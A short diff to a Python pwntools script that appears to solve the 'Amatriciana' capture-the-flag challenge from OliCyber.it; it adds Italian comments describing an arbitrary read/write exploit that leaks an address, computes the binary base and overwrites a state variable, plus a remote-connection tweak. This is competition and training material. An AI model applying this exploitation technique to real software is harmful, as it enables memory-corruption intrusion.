@@ -1,3 +1,8 @@
+# amatriciana.py - Soluzione per la CTF Amatriciana di OliCyber.it
+# Lo script sfrutta vulnerabilità di tipo "arbitrary read/write" per ottenere la flag
+# Poi sfrutta la vulnerabilità per leggere un indirizzo di memoria, 
+# calcolare l'indirizzo base del binario e scrivere un valore in una variabile di stato
+
 from pwn import ELF, context, process, ui, log, u64, p64, args, remote
 from struct import pack as spack, unpack as sunpack
 from pathlib import Path
@@ -65,7 +70,7 @@ def get_flag(io):
     return flag
 
 if __name__ == "__main__":
-    io = remote(*remotehost)
+    io = remote(*remotehost) # forzato remoto per evitare timeout
     try:
         addr = newmat(io, 1, 1, "cusumano")
         log.info(f"leaked addr: {addr:#016x}")
